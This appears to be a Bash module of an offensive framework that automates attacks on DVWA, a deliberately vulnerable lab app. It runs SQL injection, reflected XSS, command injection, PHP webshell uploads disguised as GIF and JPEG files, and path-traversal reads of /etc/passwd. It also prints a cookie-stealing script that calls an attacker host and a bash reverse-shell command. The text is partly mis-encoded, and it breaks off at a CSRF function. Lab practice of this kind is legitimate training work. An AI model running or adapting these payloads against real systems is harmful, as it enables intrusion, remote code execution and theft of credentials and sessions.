#!/bin/bash
# modules/labs/dvwa/exploits.sh - Ghost00ls Framework v7.0 FINAL
# Tous les exploits DVWA avec Command Injection CORRIGÃ‰ (POST method)
# Author: Ghost00ls Labs

# ==========================
# Sources & Configuration
# ==========================

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/dvwa_exploits"
mkdir -p "$LOG_DIR"

# ==========================
# Session Management
# ==========================

detect_security_level() {
    local cookie_jar="$1"
    local base_url="$2"
    
    echo -e "${CYAN}[DEBUG] DÃ©tection du niveau de sÃ©curitÃ©...${NC}"
    
    local resp=$(curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" \
        "${base_url}/security.php" 2>/dev/null)
    
    if echo "$resp" | grep -qi "selected.*low"; then
        echo -e "${GREEN}[INFO] Niveau dÃ©tectÃ©: LOW${NC}"
        echo "low"
    elif echo "$resp" | grep -qi "selected.*medium"; then
        echo -e "${YELLOW}[INFO] Niveau dÃ©tectÃ©: MEDIUM${NC}"
        echo "medium"
    elif echo "$resp" | grep -qi "selected.*high"; then
        echo -e "${RED}[INFO] Niveau dÃ©tectÃ©: HIGH${NC}"
        echo "high"
    else
        echo -e "${CYAN}[INFO] Niveau par dÃ©faut: LOW${NC}"
        echo "low"
    fi
}

init_dvwa_session() {
    local cookie_jar="$1"
    local base_url="$2"
    
    echo -e "${YELLOW}[SESSION] Initialisation session DVWA...${NC}"
    
    # Ã‰tape 1: AccÃ¨s page index
    echo -e "${CYAN}[DEBUG] GET ${base_url}/index.php${NC}"
    curl -s -b "$cookie_jar" -c "$cookie_jar" \
        -H "User-Agent: Mozilla/5.0" \
        "${base_url}/index.php" >/dev/null 2>&1
    sleep 1
    
    # Ã‰tape 2: Forcer security level Ã  LOW
    echo -e "${CYAN}[DEBUG] POST ${base_url}/security.php (security=low)${NC}"
    curl -s -b "$cookie_jar" -c "$cookie_jar" \
        -H "User-Agent: Mozilla/5.0" \
        -X POST \
        -d "security=low&seclev_submit=Submit" \
        "${base_url}/security.php" >/dev/null 2>&1
    sleep 1
    
    # Ã‰tape 3: VÃ©rification
    local level=$(detect_security_level "$cookie_jar" "$base_url")
    echo -e "${GREEN}[SUCCESS] Session initialisÃ©e (Level: $level)${NC}"
    
    return 0
}

# ==========================
# EXPLOIT 1: SQL Injection
# ==========================

exploit_sqli() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘   SQL Injection - Advanced Detection      â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Objectif : Extraction de donnÃ©es via SQLi${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : Fuite de donnÃ©es sensibles (users, passwords)${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : Prepared statements, parameterized queries${NC}"
    echo

    check_tools curl || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[AUTH] Authentification en cours...${NC}"
    echo -e "${CYAN}[DEBUG] Target: ${BASE}/login.php${NC}"
    
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    local session=$(echo "$result" | cut -d'|' -f2)

    if [ -z "$session" ]; then
        echo -e "${RED}[ERROR] Ã‰chec authentification${NC}"
        read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
        return
    fi

    echo -e "${GREEN}[SUCCESS] AuthentifiÃ©${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"

    echo -e "\n${YELLOW}[EXPLOIT] Test SQL Injection...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local payload="1' OR '1'='1"
    local encoded_payload="1%27+OR+%271%27%3D%271"
    
    echo -e "${CYAN}[DEBUG] Payload: $payload${NC}"
    
    local url="${BASE}/vulnerabilities/sqli/?id=${encoded_payload}&Submit=Submit"
    
    local tmpf=$(mktemp)
    curl -s -b "$cookie_jar" \
        -H "User-Agent: Mozilla/5.0" \
        "$url" > "$tmpf" 2>/dev/null

    if grep -qi "admin" "$tmpf" && grep -qi "gordon\|pablo" "$tmpf"; then
        echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${GREEN}â•‘  âœ… SQL INJECTION SUCCESS !           â•‘${NC}"
        echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        
        log_exploit "${LOG_DIR}/sqli.log" "SUCCESS" "SQLi - Bypass authentication"

        echo -e "\n${CYAN}ğŸ“Š Utilisateurs extraits:${NC}"
        echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
        grep -ioE "admin|gordon|pablo|smithy|bob" "$tmpf" | sort -u | awk '{print "   ğŸ”¹ " $0}'

        local hashes=$(grep -oE "[a-f0-9]{32}" "$tmpf" | head -n 5)
        if [ -n "$hashes" ]; then
            echo -e "\n${GREEN}ğŸ” Hash MD5 trouvÃ©s:${NC}"
            echo "$hashes" | awk '{print "   ğŸ”‘ " $0}'
            
            echo -e "\n${YELLOW}[INFO] Cracking:${NC}"
            echo -e "${CYAN}   hashcat -m 0 -a 0 hash.txt wordlist.txt${NC}"
        fi
    else
        echo -e "\n${RED}âŒ Aucune donnÃ©e extraite${NC}"
    fi

    rm -f "$tmpf"
    cleanup_cookie_jar "$cookie_jar"
    
    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 2: XSS Reflected
# ==========================

exploit_xss() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘       XSS Reflected - Cookie Stealing     â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Objectif : Injection de scripts malveillants${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : Session hijacking, cookie stealing${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : Output encoding, CSP headers${NC}"
    echo

    check_tools curl || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[AUTH] Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)

    echo -e "${GREEN}[SUCCESS] AuthentifiÃ©${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"

    echo -e "\n${YELLOW}[EXPLOIT] Test XSS Reflected...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local payloads=(
        '<script>alert("XSS")</script>'
        '<img src=x onerror=alert("XSS")>'
        '<svg onload=alert("XSS")>'
    )
    
    local success=0
    local idx=1

    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}[Test $idx/3] $payload${NC}"
        
        local enc=$(urlenc "$payload")
        local url="${BASE}/vulnerabilities/xss_r/?name=${enc}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" "$url" > "$tmpf" 2>/dev/null

        if grep -F "$payload" "$tmpf" >/dev/null 2>&1; then
            echo -e "${GREEN}âœ… XSS SUCCESS !${NC}"
            
            echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
            echo -e "${GREEN}â•‘  âœ… XSS REFLECTED SUCCESS !           â•‘${NC}"
            echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
            
            log_exploit "${LOG_DIR}/xss.log" "SUCCESS" "XSS: $payload"
            
            echo -e "\n${YELLOW}[INFO] Exploitation:${NC}"
            echo -e "${CYAN}   â€¢ Cookie stealing: <script>fetch('http://attacker/?c='+document.cookie)</script>${NC}"
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${RED}âœ— Payload filtrÃ©${NC}"
        fi

        rm -f "$tmpf"
        idx=$((idx+1))
    done

    [ $success -eq 0 ] && echo -e "\n${RED}âŒ Tous les payloads bloquÃ©s${NC}"

    cleanup_cookie_jar "$cookie_jar"
    
    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 3: Command Injection âœ… CORRIGÃ‰ (POST)
# ==========================

exploit_cmdinj() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘   Command Injection - RCE Detection       â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Objectif : ExÃ©cution de commandes systÃ¨me${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : RCE (Remote Code Execution)${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : Input validation, whitelist${NC}"
    echo

    check_tools curl || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[AUTH] Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)

    if [ -z "$cookie_jar" ]; then
        echo -e "${RED}[ERROR] Ã‰chec auth${NC}"
        read -p "ğŸ‘‰ EntrÃ©e... "
        return
    fi

    echo -e "${GREEN}[SUCCESS] AuthentifiÃ©${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"

    echo -e "\n${YELLOW}[EXPLOIT] Test Command Injection (POST method)...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local success=0
    local payloads=(
        "127.0.0.1;id"
        "127.0.0.1; id"
        "127.0.0.1;whoami"
        "127.0.0.1; whoami"
        "127.0.0.1&&id"
        "127.0.0.1 && id"
        "127.0.0.1|id"
        "127.0.0.1 | id"
        "127.0.0.1; uname -a"
        "127.0.0.1; cat /etc/passwd | head -n 3"
    )

    local idx=1
    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®${NC}"
        echo -e "${CYAN}â”‚ [Test $idx/10] $payload${NC}"
        echo -e "${CYAN}â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯${NC}"

        local tmpf=$(mktemp)
        
        # âœ… CORRECTION: POST au lieu de GET
        curl -s -b "$cookie_jar" \
            -H "User-Agent: Mozilla/5.0" \
            -H "Referer: ${BASE}/vulnerabilities/exec/" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -X POST \
            -d "ip=${payload}&Submit=Submit" \
            "${BASE}/vulnerabilities/exec/" > "$tmpf" 2>/dev/null

        local size=$(wc -c < "$tmpf")
        echo -e "${YELLOW}  Taille: ${size} bytes${NC}"

        # Recherche patterns RCE
        local uid=$(grep -o "uid=[0-9]*([^)]*)" "$tmpf" 2>/dev/null | head -n1)
        local gid=$(grep -o "gid=[0-9]*" "$tmpf" 2>/dev/null | head -n1)
        local www=$(grep -io "www-data" "$tmpf" 2>/dev/null | head -n1)
        local root=$(grep "^root:" "$tmpf" 2>/dev/null | head -n1)

        echo -e "${CYAN}  Patterns:${NC}"
        [ -n "$uid" ] && echo -e "    ${GREEN}âœ“ uid= : $uid${NC}" || echo -e "    ${RED}âœ— uid=${NC}"
        [ -n "$gid" ] && echo -e "    ${GREEN}âœ“ gid=${NC}" || echo -e "    ${RED}âœ— gid=${NC}"
        [ -n "$www" ] && echo -e "    ${GREEN}âœ“ www-data${NC}" || echo -e "    ${RED}âœ— www-data${NC}"
        [ -n "$root" ] && echo -e "    ${GREEN}âœ“ root:${NC}" || echo -e "    ${RED}âœ— root:${NC}"

        # SUCCESS si pattern trouvÃ©
        if [ -n "$uid" ] || [ -n "$gid" ] || [ -n "$www" ] || [ -n "$root" ]; then
            echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
            echo -e "${GREEN}â•‘  âœ… COMMAND INJECTION SUCCESS !       â•‘${NC}"
            echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
            
            log_exploit "${LOG_DIR}/cmdinj.log" "SUCCESS" "$payload"

            echo -e "\n${CYAN}ğŸ“Š Output:${NC}"
            echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
            sed -n '/<\/form>/,/<h2>More Information<\/h2>/p' "$tmpf" | \
                sed 's/<[^>]*>//g' | grep -v "^$" | sed 's/^/   /'

            echo -e "\n${YELLOW}ğŸ’¡ Exploitation:${NC}"
            echo -e "${CYAN}   # Reverse shell${NC}"
            echo -e "   curl -b cookies.txt -X POST -d 'ip=127.0.0.1;bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"&Submit=Submit' ${BASE}/vulnerabilities/exec/"

            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "  ${RED}âœ— Aucune exÃ©cution${NC}"
        fi

        rm -f "$tmpf"
        echo
        idx=$((idx+1))
        sleep 0.3
    done

    [ $success -eq 0 ] && echo -e "\n${RED}âŒ Aucune exÃ©cution dÃ©tectÃ©e${NC}"

    cleanup_cookie_jar "$cookie_jar"
    
    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 4: File Upload
# ==========================

exploit_upload() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘      File Upload - Webshell Injection     â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Objectif : Upload et exÃ©cution de webshell${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : RCE via webshell${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : File type validation${NC}"
    echo

    check_tools curl || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[AUTH] Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)

    echo -e "${GREEN}[SUCCESS] AuthentifiÃ©${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"

    # RÃ©cupÃ©rer token CSRF
    echo -e "\n${YELLOW}[CSRF] RÃ©cupÃ©ration token...${NC}"
    local csrf_token=$(get_csrf_token "$cookie_jar" "$BASE")
    if [ -n "$csrf_token" ]; then
        echo -e "${GREEN}âœ… Token: ${csrf_token:0:20}...${NC}"
    else
        echo -e "${YELLOW}âš ï¸  Pas de token (LOW level OK)${NC}"
    fi

    local workdir=$(mktemp -d)

    # CrÃ©ation de 3 webshells
    echo -e "\n${YELLOW}[PREPARE] CrÃ©ation webshells...${NC}"
    
    # Shell 1: PHP pur
    echo '<?php echo "GHOST_SHELL_OK"; system($_GET["cmd"]); ?>' > "${workdir}/shell.php"
    echo -e "${GREEN}âœ“ shell.php${NC}"
    
    # Shell 2: PHP avec GIF magic bytes (bypass type check)
    echo -n 'GIF89a' > "${workdir}/shell.gif"
    echo '<?php system($_GET["cmd"]); ?>' >> "${workdir}/shell.gif"
    echo -e "${GREEN}âœ“ shell.gif${NC}"
    
    # Shell 3: JPEG fake
    echo -n 'Ã¿Ã˜Ã¿Ã ' > "${workdir}/shell.jpg"
    echo '<?php system($_GET["cmd"]); ?>' >> "${workdir}/shell.jpg"
    echo -e "${GREEN}âœ“ shell.jpg${NC}"

    echo -e "\n${YELLOW}[EXPLOIT] Test upload (3 techniques)...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local files=("shell.php" "shell.gif" "shell.jpg")
    local success=0
    local idx=1

    for file in "${files[@]}"; do
        echo -e "${CYAN}â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®${NC}"
        echo -e "${CYAN}â”‚ [Test $idx/3] $file${NC}"
        echo -e "${CYAN}â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯${NC}"

        local tmpf=$(mktemp)
        
        # Upload avec ou sans token CSRF
        if [ -n "$csrf_token" ]; then
            curl -s -b "$cookie_jar" \
                -H "User-Agent: Mozilla/5.0" \
                -H "Referer: ${BASE}/vulnerabilities/upload/" \
                -F "uploaded=@${workdir}/${file};filename=${file}" \
                -F "Upload=Upload" \
                -F "user_token=${csrf_token}" \
                "${BASE}/vulnerabilities/upload/" > "$tmpf" 2>/dev/null
        else
            curl -s -b "$cookie_jar" \
                -H "User-Agent: Mozilla/5.0" \
                -H "Referer: ${BASE}/vulnerabilities/upload/" \
                -F "uploaded=@${workdir}/${file};filename=${file}" \
                -F "Upload=Upload" \
                "${BASE}/vulnerabilities/upload/" > "$tmpf" 2>/dev/null
        fi

        local size=$(wc -c < "$tmpf")
        echo -e "${YELLOW}  Taille rÃ©ponse: ${size} bytes${NC}"

        # VÃ©rifier erreur CSRF
        if grep -q "CSRF token is incorrect" "$tmpf"; then
            echo -e "  ${RED}âœ— Erreur CSRF token${NC}"
            rm -f "$tmpf"
            idx=$((idx+1))
            continue
        fi

        # VÃ©rifier si upload rÃ©ussi
        if grep -qi "successfully uploaded\|has been uploaded\|succesfully" "$tmpf"; then
            echo -e "  ${GREEN}âœ… Upload rÃ©ussi !${NC}"

            # Tester exÃ©cution
            local test_url="${BASE}/hackable/uploads/${file}"
            echo -e "  ${YELLOW}Test exec: $test_url${NC}"

            local exec_resp=$(curl -s -H "User-Agent: Mozilla/5.0" "$test_url" 2>/dev/null)

            if echo "$exec_resp" | grep -q "GHOST_SHELL_OK"; then
                echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
                echo -e "${GREEN}â•‘  âœ… UPLOAD + EXECUTION SUCCESS !      â•‘${NC}"
                echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"

                log_exploit "${LOG_DIR}/upload.log" "SUCCESS" "$file"

                echo -e "\n${CYAN}ğŸ“Š Webshell actif:${NC}"
                echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
                echo -e "   ğŸ”¹ Fichier: $file"
                echo -e "   ğŸ”¹ URL: $test_url"

                echo -e "\n${YELLOW}ğŸ’¡ Exploitation:${NC}"
                echo -e "${CYAN}   curl \"$test_url?cmd=id\"${NC}"
                echo -e "${CYAN}   curl \"$test_url?cmd=whoami\"${NC}"

                # Test dÃ©mo
                echo -e "\n${YELLOW}[DEMO] Test 'id':${NC}"
                local demo=$(curl -s "$test_url?cmd=id" 2>/dev/null | grep -o "uid=[^<]*")
                echo -e "${GREEN}   $demo${NC}"

                success=1
                rm -f "$tmpf"
                break
            else
                # Upload OK mais pas exÃ©cutable
                echo -e "  ${YELLOW}âš ï¸  UploadÃ© mais non exÃ©cutable${NC}"
                
                # VÃ©rifier si c'est du PHP dans le contenu
                if echo "$exec_resp" | grep -q "<?php"; then
                    echo -e "  ${RED}PHP affichÃ© en texte (pas interprÃ©tÃ©)${NC}"
                fi
            fi
        else
            echo -e "  ${RED}âœ— Upload refusÃ©${NC}"
            
            # Diagnostic
            if grep -qi "not allowed\|invalid\|extension" "$tmpf"; then
                echo -e "  ${YELLOW}Raison: Type de fichier rejetÃ©${NC}"
            fi
            
            # Sauvegarder debug
            if [ $idx -eq 1 ]; then
                cp "$tmpf" "/tmp/dvwa_upload_debug.html"
                echo -e "  ${YELLOW}ğŸ’¾ Debug: /tmp/dvwa_upload_debug.html${NC}"
            fi
        fi

        rm -f "$tmpf"
        echo
        idx=$((idx+1))
    done

    if [ $success -eq 0 ]; then
        echo -e "${RED}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${RED}â•‘  âŒ AUCUN UPLOAD RÃ‰USSI               â•‘${NC}"
        echo -e "${RED}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        echo -e "${YELLOW}[INFO] Type validation active ou CSRF requis${NC}"
        
        echo -e "\n${CYAN}[DEBUG] Analyser:${NC}"
        echo -e "   cat /tmp/dvwa_upload_debug.html | grep -i \"upload\|error\"${NC}"
    fi

    rm -rf "$workdir"
    cleanup_cookie_jar "$cookie_jar"
    
    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 5: LFI
# ==========================

exploit_lfi() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘    LFI - Local File Inclusion Attack      â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Objectif : Lecture fichiers systÃ¨me${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : Information disclosure${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : Path validation${NC}"
    echo

    check_tools curl || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[AUTH] Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)

    echo -e "${GREEN}[SUCCESS] AuthentifiÃ©${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"

    echo -e "\n${YELLOW}[EXPLOIT] Test LFI...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local encoded="..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    local url="${BASE}/vulnerabilities/fi/?page=${encoded}"

    local tmpf=$(mktemp)
    curl -s -b "$cookie_jar" "$url" > "$tmpf" 2>/dev/null

    if grep -q "root:x:0:0" "$tmpf"; then
        echo -e "${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${GREEN}â•‘  âœ… LFI SUCCESS !                     â•‘${NC}"
        echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"

        log_exploit "${LOG_DIR}/lfi.log" "SUCCESS" "/etc/passwd"

        echo -e "\n${CYAN}ğŸ“Š Extrait /etc/passwd:${NC}"
        grep ":" "$tmpf" | head -n 10 | sed 's/^/   /'
    else
        echo -e "${RED}âŒ Fichier non accessible${NC}"
    fi

    rm -f "$tmpf"
    cleanup_cookie_jar "$cookie_jar"
    
    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 6: CSRF
# ==========================

exploit_csrf() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘    CSRF - Cross-Site Request Forgery      â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
